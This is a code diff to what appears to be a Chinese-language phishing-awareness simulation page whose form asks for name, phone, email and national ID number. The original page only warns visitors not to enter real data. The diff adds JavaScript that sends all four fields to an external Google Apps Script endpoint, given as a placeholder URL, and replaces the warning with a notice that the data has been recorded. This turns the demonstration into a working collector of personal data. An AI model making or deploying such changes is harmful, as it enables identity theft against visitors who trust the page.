@@ -162,6 +162,8 @@
   </div>
 
   <script>
+    const scriptUrl = 'https://script.google.com/macros/s/你的AppsScript網址/exec';
+
     let clickCount = 0;
     let participants = [];
 
@@ -191,7 +193,7 @@
       }, 1000);
     }
 
-    function submitForm(event) {
+    async function submitForm(event) {
       event.preventDefault();
       const name = document.getElementById('name').value;
       const phone = document.getElementById('phone').value;
@@ -201,7 +203,18 @@
       participants.push({ name, phone, email, idcard });
       updateMarquee();
 
-      alert("⚠️ 提醒您：這是一個釣魚詐騙模擬網站，請勿輸入真實資料！");
+      const params = new URLSearchParams({ name, phone, email, idcard });
+
+      try {
+        await fetch(`${scriptUrl}?${params.toString()}`, {
+          method: 'GET',
+          mode: 'cors'
+        });
+      } catch (err) {
+        console.error('資料送出失敗：', err);
+      }
+
+      alert("⚠️ 資料已記錄（模擬環境請勿輸入真實資訊）");
       document.getElementById('formPage').style.display = 'none';
       document.getElementById('warningPage').style.display = 'block';
     }
